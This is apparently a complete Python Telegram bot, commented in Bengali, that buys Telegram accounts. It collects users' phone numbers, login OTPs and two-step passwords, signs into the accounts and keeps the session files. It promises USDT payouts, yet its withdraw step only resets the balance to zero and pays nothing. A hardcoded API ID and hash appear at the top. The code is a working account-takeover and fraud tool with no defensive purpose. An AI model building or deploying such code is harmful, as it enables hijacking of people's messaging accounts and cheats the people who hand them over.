import asyncio
import re
import sqlite3
import random
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired

# --- ১. ক্রেডেনশিয়ালস সেটআপ ---
API_ID = 35393197
API_HASH = "eddb2d01c5e59ed537b70cfc350068d8"
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # এখানে আপনার টোকেনটি দিন

bot = Client("combined_pyro_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

user_data = {}

# --- ২. কান্ট্রি কনফিগারেশন ---
COUNTRY_CONFIG = {
    '880': {'name': 'Bangladesh 🇧🇩', 'prize': 0.50, 'capacity': 100},
    '1':   {'name': 'USA 🇺🇸', 'prize': 1.20, 'capacity': 50},
    '7':   {'name': 'Russia 🇷🇺', 'prize': 0.80, 'capacity': 80},
    '44':  {'name': 'UK 🇬🇧', 'prize': 1.50, 'capacity': 30}
}

# --- ৩. ডাটাবেজ ফাংশনসমূহ (সংশোধিত) ---
def init_db():
    conn = sqlite3.connect('combined_reward.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.00,
            total_submitted INTEGER DEFAULT 0,
            pending_claims INTEGER DEFAULT 0,
            is_verified INTEGER DEFAULT 0
        )
    ''')
    
    # 🛠️ ফিক্স: যদি পুরনো ডাটাবেজ থাকে, তবে জোরপূর্বক 'is_verified' কলামটি যোগ করা হবে
    try:
        cursor.execute('ALTER TABLE users ADD COLUMN is_verified INTEGER DEFAULT 0')
    except sqlite3.OperationalError:
        pass  # কলাম ইতিমধ্যে থাকলে এরর স্কিপ করবে

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS countries (
            country_code TEXT PRIMARY KEY,
            capacity INTEGER
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tracked_numbers (
            phone_number TEXT PRIMARY KEY,
            status TEXT
        )
    ''')
    for code, info in COUNTRY_CONFIG.items():
        cursor.execute('INSERT OR IGNORE INTO countries (country_code, capacity) VALUES (?, ?)', (code, info['capacity']))
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect('combined_reward.db')
    cursor = conn.cursor()
    cursor.execute('SELECT balance, total_submitted, pending_claims, is_verified FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    if not row:
        cursor.execute('INSERT INTO users (user_id, is_verified) VALUES (?, 0)', (user_id,))
        conn.commit()
        row = (0.00, 0, 0, 0)
    conn.close()
    return row

def update_db(query, params=()):
    conn = sqlite3.connect('combined_reward.db')
    cursor = conn.cursor()
    cursor.execute(query, params)
    conn.commit()
    conn.close()

def get_capacity(code):
    conn = sqlite3.connect('combined_reward.db')
    cursor = conn.cursor()
    cursor.execute('SELECT capacity FROM countries WHERE country_code = ?', (code,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else 0

def check_number_status(phone_number):
    conn = sqlite3.connect('combined_reward.db')
    cursor = conn.cursor()
    cursor.execute('SELECT status FROM tracked_numbers WHERE phone_number = ?', (phone_number,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

# --- ৪. ভেরিফিকেশন গার্ড ফিল্টার ---
def verified_only():
    async def func(flt, client, message: Message):
        user = get_user(message.from_user.id)
        return user[3] == 1
    return filters.create(func)

# --- ৫. অটো ক্লেইম টাস্ক ---
async def auto_claim_worker(user_id, prize_amount):
    await asyncio.sleep(600)  
    update_db(
        'UPDATE users SET balance = balance + ?, total_submitted = total_submitted + 1, pending_claims = pending_claims - 1 WHERE user_id = ?', 
        (prize_amount, user_id)
    )
    try:
        await bot.send_message(
            user_id, 
            f"🎉 **Auto Claim Successful!**\n\nYour verification is completed. {prize_amount:.2f} USDT has been added to your balance."
        )
    except Exception as e:
        print(f"Notification Error: {e}")

# --- ৬. কম্যান্ড হ্যান্ডলারস ---

@bot.on_message(filters.command("start") & filters.private)
async def cmd_start(client: Client, message: Message):
    user_id = message.from_user.id
    _, _, _, is_verified = get_user(user_id)
    
    if is_verified == 1:
        await message.reply_text(
            "👋 **Welcome Back!** You are already verified.\n\n"
            "Use these commands to navigate:\n"
            "📱 /sellaccount - Submit new numbers\n"
            "👤 /account - View your stats\n"
            "🌍 /capacity - Check country rates\n"
            "💳 /withdraw - Claim money"
        )
        return

    num1 = random.randint(10, 50)
    num2 = random.randint(1, 9)
    answer = num1 + num2
    
    user_data[user_id] = {'step': 'WAITING_FOR_CAPTCHA', 'captcha_ans': answer}
    
    await message.reply_text(
        "🛡️ **Human Verification Required!**\n\n"
        f"Please solve this math puzzle to access the bot:\n"
        f"👉 **{num1} + {num2} = ?**\n\n"
        "*(Send just the number answer)*"
    )

@bot.on_message(filters.command("sellaccount") & filters.private & verified_only())
async def cmd_sellaccount(client: Client, message: Message):
    user_id = message.from_user.id
    user_data[user_id] = {'step': 'WAITING_FOR_NUMBER', 'country': None, 'phone': None}
    await message.reply_text(
        "📱 **Please send the Telegram phone number with Country Code.**\n\n"
        "Example: `+8801834566397`"
    )

@bot.on_message(filters.command("cancel") & filters.private & verified_only())
async def cmd_cancel(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id in user_data:
        if 'user_client' in user_data[user_id]:
            try: await user_data[user_id]['user_client'].disconnect()
            except: pass
        user_data.pop(user_id, None)
    await message.reply_text("🔄 **Process Reset!** Current submission cancelled.")

@bot.on_message(filters.command("account") & filters.private & verified_only())
async def cmd_account(client: Client, message: Message):
    user_id = message.from_user.id
    balance, total, pending, _ = get_user(user_id)
    
    account_text = (
        "👤 **YOUR ACCOUNT DATA** 👤\n\n"
        f"🆔 User ID: `{user_id}`\n"
        f"📊 Total Submitted Accounts: `{total}`\n"
        f"⏳ Processing/Claim Pending: `{pending}`\n"
        f"💰 Available Balance: `{balance:.2f} USDT`"
    )
    await message.reply_text(account_text)

@bot.on_message(filters.command("capacity") & filters.private & verified_only())
async def cmd_capacity(client: Client, message: Message):
    capacity_text = "🌍 **BOT CAPACITY & PRICE LIST** 🌍\n\n"
    for code, info in COUNTRY_CONFIG.items():
        current_cap = get_capacity(code)
        capacity_text += f"🔹 {info['name']} (+{code})\n   ⤷ Prize: `{info['prize']:.2f} USDT` | Capacity Left: `{current_cap}`\n\n"
    await message.reply_text(capacity_text)

@bot.on_message(filters.command("withdraw") & filters.private & verified_only())
async def cmd_withdraw(client: Client, message: Message):
    user_id = message.from_user.id
    balance, total, _, _ = get_user(user_id)
    
    if total < 5:
        await message.reply_text("❌ **Withdraw Locked!**\n\nYou must submit a minimum of **5 accounts** to unlock withdrawal features.")
    else:
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"💳 Request Withdraw ({balance:.2f} USDT)", callback_data="req_withdraw")]
        ])
        await message.reply_text(f"📢 **Withdraw Panel Available**\n\nYour Balance: `{balance:.2f} USDT`", reply_markup=markup)

# --- 🎯 ইনলাইন বাটন হ্যান্ডলার ---
@bot.on_callback_query(filters.regex("req_withdraw"))
async def handle_withdraw_click(client: Client, call):
    user_id = call.from_user.id
    _, total, _, _ = get_user(user_id)
    
    if total < 5:
        await call.answer("❌ You need minimum 5 accounts!", show_alert=True)
        return

    user_data[user_id] = {'step': 'WAITING_FOR_LEADER_CARD', 'country': None, 'phone': None}
    await call.message.edit_text("📝 Please enter your **Leader Card Info**.\n\n*English characters only.*")

# --- 🚀 টেক্সট মেসেজ হ্যান্ডলিং কোর লজিক ---
@bot.on_message(filters.text & filters.private)
async def handle_all_messages(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id not in user_data or user_data[user_id] is None:
        return

    current_step = user_data[user_id]['step']

    # ক্যাপচা হ্যান্ডলার
    if current_step == 'WAITING_FOR_CAPTCHA':
        correct_ans = user_data[user_id].get('captcha_ans')
        if text == str(correct_ans):
            update_db('UPDATE users SET is_verified = 1 WHERE user_id = ?', (user_id,))
            user_data.pop(user_id, None)
            
            try: await message.delete()
            except: pass
                
            await message.reply_text(
                "✅ **Verification Successful!** All features unlocked.\n\n"
                "To submit a new number, use: /sellaccount\n"
                "To check details: /account"
            )
        else:
            await message.reply_text("❌ **Wrong Answer!** Try again or type /start to generate a new puzzle.")
        return

    # নম্বর রিসিভ করার ধাপ
    if current_step == 'WAITING_FOR_NUMBER':
        if not re.match(r'^\+\d{10,15}$', text):
            await message.reply_text("❌ **Wrong input!** Format: `+88018XXXXXXXX`")
            return

        num_status = check_number_status(text)
        if num_status in ["SUCCESS", "REJECTED"]:
            await message.reply_text(f"❌ **Number Status: {num_status}!** This number cannot be used.")
            user_data.pop(user_id, None)
            return
        
        detected_code = next((code for code in COUNTRY_CONFIG.keys() if text.startswith(f"+{code}")), None)
        if not detected_code or get_capacity(detected_code) <= 0:
            await message.reply_text("❌ Country not supported or capacity full!")
            return
            
        await message.reply_text("🔄 Sending OTP, please wait...")
        user_client = Client(f"session_{user_id}", api_id=API_ID, api_hash=API_HASH)
        await user_client.connect()
        
        try:
            code_info = await user_client.send_code(text)
            user_data[user_id] = {
                'step': 'WAITING_FOR_OTP', 'country': detected_code, 'phone': text,
                'user_client': user_client, 'phone_code_hash': code_info.phone_code_hash, 'attempts': 3
            }
            await message.reply_text(f"📩 OTP Sent. Enter the code here:")
        except Exception as e:
            await user_client.disconnect()
            update_db('INSERT OR REPLACE INTO tracked_numbers (phone_number, status) VALUES (?, ?)', (text, "REJECTED"))
            await message.reply_text(f"❌ Error: {e}")
            user_data.pop(user_id, None)

    # ওটিপি ভেরিফিকেশন
    elif current_step == 'WAITING_FOR_OTP':
        u_data = user_data[user_id]
        user_client = u_data.get("user_client")
        phone = u_data.get("phone")
        
        try:
            await user_client.sign_in(phone, u_data.get("phone_code_hash"), text)
            await message.reply_text(f"✅ **Login Successful!** Waiting 10 minutes for confirmation...")
            
            update_db('UPDATE countries SET capacity = capacity - 1 WHERE country_code = ?', (u_data.get("country"),))
            update_db('UPDATE users SET pending_claims = pending_claims + 1 WHERE user_id = ?', (user_id,))
            update_db('INSERT OR REPLACE INTO tracked_numbers (phone_number, status) VALUES (?, ?)', (phone, "SUCCESS"))
            
            await user_client.disconnect()
            asyncio.create_task(auto_claim_worker(user_id, COUNTRY_CONFIG[u_data.get("country")]['prize']))
            user_data.pop(user_id, None)
            
        except SessionPasswordNeeded:
            user_data[user_id]['step'] = "WAITING_FOR_PASSWORD"
            user_data[user_id]['pwd_attempts'] = 3 
            await message.reply_text("🔒 2-Step Verification enabled. Enter password:")
            
        except (PhoneCodeInvalid, PhoneCodeExpired):
            user_data[user_id]['attempts'] -= 1
            remaining = user_data[user_id]['attempts']
            if remaining > 0:
                await message.reply_text(f"❌ **Invalid OTP!** ({remaining} attempts left):")
            else:
                await user_client.disconnect()
                update_db('INSERT OR REPLACE INTO tracked_numbers (phone_number, status) VALUES (?, ?)', (phone, "REJECTED"))
                await message.reply_text(f"❌ Too many wrong attempts! Rejected.")
                user_data.pop(user_id, None)
        except Exception as e:
            await user_client.disconnect()
            user_data.pop(user_id, None)

    # পাসওয়ার্ড ধাপ
    elif current_step == 'WAITING_FOR_PASSWORD':
        u_data = user_data[user_id]
        user_client = u_data.get("user_client")
        phone = u_data.get("phone")
        
        try:
            await user_client.check_password(text)
            await message.reply_text(f"✅ **Verified!** Waiting 10 minutes...")
            update_db('UPDATE countries SET capacity = capacity - 1 WHERE country_code = ?', (u_data.get("country"),))
            update_db('UPDATE users SET pending_claims = pending_claims + 1 WHERE user_id = ?', (user_id,))
            update_db('INSERT OR REPLACE INTO tracked_numbers (phone_number, status) VALUES (?, ?)', (phone, "SUCCESS"))
            await user_client.disconnect()
            asyncio.create_task(auto_claim_worker(user_id, COUNTRY_CONFIG[u_data.get("country")]['prize']))
            user_data.pop(user_id, None)
        except Exception:
            user_data[user_id]['pwd_attempts'] -= 1
            remaining_pwd = user_data[user_id]['pwd_attempts']
            if remaining_pwd > 0:
                await message.reply_text(f"❌ **Incorrect Password!** ({remaining_pwd} left):")
            else:
                await user_client.disconnect()
                update_db('INSERT OR REPLACE INTO tracked_numbers (phone_number, status) VALUES (?, ?)', (phone, "REJECTED"))
                await message.reply_text(f"❌ Too many wrong attempts! Locked.")
                user_data.pop(user_id, None)

    # লিডার কার্ড
    elif current_step == 'WAITING_FOR_LEADER_CARD':
        if not re.match(r'^[a-zA-Z\s]+$', text):
            await message.reply_text("❌ English characters only. Try again:")
            return
        update_db('UPDATE users SET balance = 0.00, total_submitted = 0 WHERE user_id = ?', (user_id,))
        await message.reply_text(f"✅ **Withdraw Requested to:** **{text}**")
        user_data.pop(user_id, None)

if __name__ == "__main__":
    bot.run()
